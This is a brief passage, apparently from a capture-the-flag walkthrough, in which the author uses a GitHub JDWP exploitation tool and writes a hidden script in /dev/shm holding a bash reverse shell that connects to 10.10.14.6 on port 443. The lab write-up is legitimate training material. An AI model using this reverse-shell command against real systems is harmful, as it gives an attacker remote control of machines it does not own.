@@ -1,0 +1,1 @@
+ne worked really well. Shell There’s a script that I can use from GitHub, jwdp-shellifier . To keep the process simple, I’ll write a shell script in /dev/shm/ : alexa@AI:~$ cat /dev/shm/.df.sh #!/bin/bash bash -i >& /dev/tcp/10.10.14.6/443 0>&1 Now I’ll
